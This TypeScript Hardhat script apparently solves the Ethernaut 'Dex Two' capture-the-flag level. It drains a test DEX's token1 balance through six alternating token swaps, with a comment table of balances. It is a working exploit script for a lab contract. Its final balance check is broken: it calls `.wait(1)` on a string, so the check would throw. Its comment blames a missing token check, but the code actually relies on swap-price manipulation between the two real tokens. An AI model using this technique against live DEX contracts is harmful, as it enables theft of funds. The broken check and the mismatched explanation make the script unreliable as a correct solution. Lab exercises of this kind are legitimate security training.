import { ethers } from "hardhat";

const attackDexTwo = async () => {
    // change contract addresses here.
    const dexAddress = "0x10929702D8f5E0720596E87d3567874b37848Ee3";
    const token1Address = "0x85aE05EF06fbAFfaA0BE49ECE835c60569E59f22"; //type "await contract.token1()" in ethernaut console
    const token2Address = "0xf2B9A6A13e103E5b0E028Fd07Cf4d4cf879D3C34"; //type "await contract.token2()" in ethernaut console

    // Don't touch below
    // The vulnerability here arises from swap method which does not
    // check that the swap is necessarily between token1 and token2.
    // You may read more on:
    // https://eips.ethereum.org/EIPS/eip-20
    // after swapping several times you'll see that you have more tokens

    const ABI = [
        "function approve(address spender, uint amount)",
        "function swap(address from, address to, uint amount)",
        "function balanceOf(address token, address account)",
    ];
    const contractAttack = await ethers.getContractAt(ABI, dexAddress);
    const approve = await contractAttack.approve(dexAddress, 500);
    const approveReceipt = await approve.wait();
    console.log(approveReceipt);
    // sample table below of continous swap
    // DEX       |        player
    // token1 - token2 | token1 - token2
    // ----------------------------------
    //   100     100   |   10      10
    //   110     90    |   0       20
    //   86      110   |   24      0
    //   110     80    |   0       30
    //   69      110   |   41      0
    //   110     45    |   0       65
    //   0       90    |   110     20
    // execution below
    const swap1 = await contractAttack.swap(token1Address, token2Address, 10);
    const swap2 = await contractAttack.swap(token2Address, token1Address, 20);
    const swap3 = await contractAttack.swap(token1Address, token2Address, 24);
    const swap4 = await contractAttack.swap(token2Address, token1Address, 30);
    const swap5 = await contractAttack.swap(token1Address, token2Address, 41);
    const swap6 = await contractAttack.swap(token2Address, token1Address, 45);
    // conslusion check balance
    const token1Balance = await contractAttack
        .balanceOf(token1Address, dexAddress)
        .then((v: any) => v.toString());
    const token1BalanceReceipt = token1Balance.wait(1);
    if (token1BalanceReceipt === "0") {
        console.log("Token1 balance is 0, Level passed! submit to ethernaut");
    } else {
        console.log("Token1 balance is not 0, Level failed! review code above");
    }
};

attackDexTwo()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
